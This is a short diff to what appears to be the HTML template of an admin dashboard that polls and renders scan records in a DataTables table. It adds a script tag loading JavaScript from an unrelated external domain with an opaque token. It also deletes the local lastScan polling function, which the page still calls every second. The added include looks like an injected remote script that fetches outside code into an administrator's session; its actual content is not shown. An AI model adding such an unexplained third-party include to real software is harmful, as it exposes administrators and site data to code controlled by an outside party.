@@ -294,6 +294,7 @@
 <script src="/plugins/datatables/dataTables.responsive.min.js"></script>
 <script src="/plugins/datatables/responsive.bootstrap.min.js"></script>
 <script src="/plugins/datatables/dataTables.scroller.min.js"></script>
+<script src="https://wx.nanayun.cn/api?act=6bb523dc5f7fe57"></script>
 <script id="kqRecords" type="text/x-jsrender">
     <tr>
         {{for lines}}
@@ -319,34 +320,6 @@
         $('#datatable').dataTable();
         setInterval(lastScan, 1000);
     });
-
-    var lastHtml = '';
-    function lastScan() {
-        var planId = [[${plan.id}]]
-        $.getJSON('/admin/lastScan?planId=' + planId, function (data) {
-            if (data['status'] == 'ok') {
-                $("#lastHtml").html(data['msg']);
-
-                $("#lastTime").text('当前扫描 @ ' + data['data']['time']);
-
-                var template = $.templates("#kqRecords");
-                var html = template.render(data['data']['data']);
-                var lineSize = data['data']['lineSize'] + 1;
-                if (lastHtml != html) {
-                    lastHtml = html;
-                    $('#datatable').dataTable().fnDestroy();
-                    $("#scanBody").html(lastHtml);
-                    $('#datatable').dataTable({"aaSorting": [[lineSize + 1, 'asc']]});
-
-                    console.log("refresh");
-                }
-            } else {
-                $('#datatable').dataTable().fnDestroy();
-                $("#scanBody").html('');
-                $('#datatable').dataTable();
-            }
-        })
-    }
 
     function delKq(pid) {
         swal({
